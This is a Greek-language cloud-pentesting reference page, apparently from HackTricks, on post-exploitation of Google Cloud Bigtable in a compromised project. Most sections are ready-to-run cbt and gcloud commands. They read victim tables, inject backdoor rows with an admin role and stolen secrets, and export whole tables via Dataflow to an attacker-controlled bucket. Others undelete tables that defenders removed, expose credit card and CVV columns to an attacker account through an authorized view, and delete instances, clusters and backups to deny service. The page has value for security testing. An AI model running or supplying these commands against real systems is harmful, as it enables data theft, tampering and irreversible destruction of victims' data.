# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Για περισσότερες πληροφορίες σχετικά με το Bigtable δείτε:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Εγκαταστήστε το `cbt` CLI μία φορά μέσω του Cloud SDK ώστε οι εντολές παρακάτω να λειτουργούν τοπικά:
>
> ```bash
> gcloud components install cbt
> ```

### Ανάγνωση γραμμών

**Δικαιώματα:** `bigtable.tables.readRows`

`cbt` συνοδεύεται από το Cloud SDK και επικοινωνεί με τα admin/data APIs χωρίς να χρειάζεται ενδιάμεσο λογισμικό. Δείξτε το στο συμβιβασμένο project/instance και εξάγετε τις γραμμές απευθείας από τον πίνακα. Περιορίστε τη σάρωση αν θέλετε μόνο μια γρήγορη ματιά.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Εγγραφή σειρών

**Δικαιώματα:** `bigtable.tables.mutateRows`, (θα χρειαστείτε `bigtable.tables.readRows` για να επιβεβαιώσετε την αλλαγή).

Χρησιμοποιήστε το ίδιο εργαλείο για να upsert arbitrary cells. Αυτός είναι ο ταχύτερος τρόπος για να backdoor configs, drop web shells, ή να plant poisoned dataset rows.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` αποδέχεται raw bytes μέσω της σύνταξης `@/path`, οπότε μπορείτε να push compiled payloads ή serialized protobufs ακριβώς όπως τα αναμένουν οι downstream services.

### Εξαγωγή γραμμών στο bucket σας

**Δικαιώματα:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Είναι δυνατόν να εξαχθεί το περιεχόμενο ενός ολόκληρου πίνακα σε ένα bucket που ελέγχεται από τον επιτιθέμενο, εκκινώντας μια εργασία Dataflow που γράφει τις γραμμές σε ένα GCS bucket που ελέγχετε.

> [!NOTE]
> Σημειώστε ότι θα χρειαστείτε την άδεια `iam.serviceAccounts.actAs` σε κάποιο SA με επαρκή δικαιώματα για να πραγματοποιήσει την εξαγωγή (εξ ορισμού, αν δεν υποδειχθεί διαφορετικά, θα χρησιμοποιηθεί το προεπιλεγμένο compute SA).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Αλλάξτε το template σε `Cloud_Bigtable_to_GCS_Parquet` ή `Cloud_Bigtable_to_GCS_SequenceFile` αν θέλετε εξαγωγές σε Parquet/SequenceFile αντί για JSON. Οι άδειες είναι οι ίδιες· αλλάζει μόνο το path του template.

### Εισαγωγή γραμμών

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Είναι δυνατό να εισαχθεί το περιεχόμενο ολόκληρου ενός table από ένα bucket που ελέγχει ο attacker, εκκινούμενος μια Dataflow job που μεταφέρει (streams) γραμμές σε ένα GCS bucket που ελέγχετε. Για αυτό, ο attacker θα χρειαστεί πρώτα να δημιουργήσει ένα parquet file με τα δεδομένα που θα εισαχθούν και το αναμενόμενο schema. Ο attacker μπορεί πρώτα να εξαγάγει τα δεδομένα σε μορφή parquet ακολουθώντας την προηγούμενη τεχνική με τη ρύθμιση `Cloud_Bigtable_to_GCS_Parquet` και να προσθέσει νέες εγγραφές στο κατεβασμένο parquet file



> [!NOTE]
> Σημειώστε ότι θα χρειαστείτε την άδεια `iam.serviceAccounts.actAs` πάνω σε κάποιο SA με επαρκή permissions για να εκτελέσει την εξαγωγή (by default, αν δεν υποδειχθεί διαφορετικά, το default compute SA θα χρησιμοποιηθεί).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Επαναφορά backups

**Δικαιώματα:** `bigtable.backups.restore`, `bigtable.tables.create`.

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να επαναφέρει ένα backup σε νέο πίνακα υπό τον έλεγχό του, ώστε να ανακτήσει παλιά ευαίσθητα δεδομένα.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Ανάκτηση διαγραμμένων πινάκων

**Δικαιώματα:** `bigtable.tables.undelete`

Το Bigtable υποστηρίζει soft-deletion με χρονικό περιθώριο χάριτος (συνήθως 7 ημέρες από προεπιλογή). Εντός αυτού του παραθύρου, ένας attacker με το δικαίωμα `bigtable.tables.undelete` μπορεί να επαναφέρει έναν πρόσφατα διαγραμμένο πίνακα και να ανακτήσει όλα τα δεδομένα του, ενδεχομένως αποκτώντας πρόσβαση σε ευαίσθητες πληροφορίες που θεωρούνταν κατεστραμμένες.

Αυτό είναι ιδιαίτερα χρήσιμο για:
- Ανάκτηση δεδομένων από πίνακες που διαγράφηκαν από defenders κατά την incident response
- Πρόσβαση σε ιστορικά δεδομένα που εκκαθαρίστηκαν σκόπιμα
- Αναστροφή τυχαίων ή κακόβουλων διαγραφών για διατήρηση persistence
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> Η λειτουργία undelete λειτουργεί μόνο εντός της ρυθμισμένης περιόδου διατήρησης (προεπιλογή 7 ημέρες). Αφού λήξει αυτό το διάστημα, ο πίνακας και τα δεδομένα του διαγράφονται οριστικά και δεν μπορούν να ανακτηθούν με αυτή τη μέθοδο.


### Δημιουργία εξουσιοδοτημένων προβολών

**Δικαιώματα:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Οι εξουσιοδοτημένες προβολές σάς επιτρέπουν να παρουσιάζετε ένα επιλεγμένο υποσύνολο του πίνακα. Αντί να τηρείτε την αρχή του ελάχιστου προνομίου, χρησιμοποιήστε τες για να δημοσιεύσετε ακριβώς τα ευαίσθητα σύνολα στηλών/σειρών που σας ενδιαφέρουν και να προσθέσετε στη λευκή λίστα τη δική σας principal.

> [!WARNING]
> Το θέμα είναι ότι για να δημιουργήσετε μια εξουσιοδοτημένη προβολή πρέπει επίσης να μπορείτε να διαβάζετε και να τροποποιείτε σειρές στον βασικό πίνακα, επομένως δεν αποκτάτε κανένα επιπλέον δικαίωμα — για αυτό η τεχνική αυτή είναι στην πράξη σχεδόν άχρηστη.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Επειδή η πρόσβαση περιορίζεται στην προβολή, οι υπεύθυνοι ασφάλειας συχνά παραβλέπουν το γεγονός ότι μόλις δημιουργήσατε ένα νέο endpoint υψηλής ευαισθησίας.

### Ανάγνωση Authorized Views

**Δικαιώματα:** `bigtable.authorizedViews.readRows`

Εάν έχετε πρόσβαση σε ένα Authorized View, μπορείτε να διαβάσετε δεδομένα από αυτό χρησιμοποιώντας τις βιβλιοθήκες πελάτη του Bigtable, καθορίζοντας το όνομα του Authorized View στα αιτήματα ανάγνωσής σας. Σημειώστε ότι το Authorized View πιθανόν θα περιορίζει τι μπορείτε να προσπελάσετε από τον πίνακα. Παρακάτω υπάρχει ένα παράδειγμα χρησιμοποιώντας Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**Permissions:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Οποιαδήποτε από τις δικαιοδοσίες διαγραφής του Bigtable μπορεί να χρησιμοποιηθεί για επιθέσεις denial of service. Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να διαταράξει τις λειτουργίες διαγράφοντας κρίσιμους πόρους του Bigtable:

- **`bigtable.appProfiles.delete`**: Διαγραφή application profiles, διακόπτοντας τις συνδέσεις πελατών και τις ρυθμίσεις δρομολόγησης
- **`bigtable.authorizedViews.delete`**: Αφαίρεση authorized views, αποκόπτοντας νόμιμες οδούς πρόσβασης για εφαρμογές
- **`bigtable.authorizedViews.deleteTagBinding`**: Αφαίρεση tag bindings από τα authorized views
- **`bigtable.backups.delete`**: Καταστροφή backup snapshots, εξαλείφοντας τις επιλογές disaster recovery
- **`bigtable.clusters.delete`**: Διαγραφή ολόκληρων clusters, προκαλώντας άμεση μη διαθεσιμότητα δεδομένων
- **`bigtable.instances.delete`**: Αφαίρεση ολόκληρων Bigtable instances, διαγράφοντας όλους τους πίνακες και τις ρυθμίσεις
- **`bigtable.tables.delete`**: Διαγραφή μεμονωμένων tables, προκαλώντας απώλεια δεδομένων και αποτυχίες εφαρμογών
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Οι ενέργειες διαγραφής είναι συχνά άμεσες και μη αναστρέψιμες. Βεβαιωθείτε ότι υπάρχουν αντίγραφα ασφαλείας πριν δοκιμάσετε αυτές τις εντολές, καθώς μπορούν να προκαλέσουν μόνιμη απώλεια δεδομένων και σοβαρή διακοπή υπηρεσίας.

{{#include ../../../banners/hacktricks-training.md}}
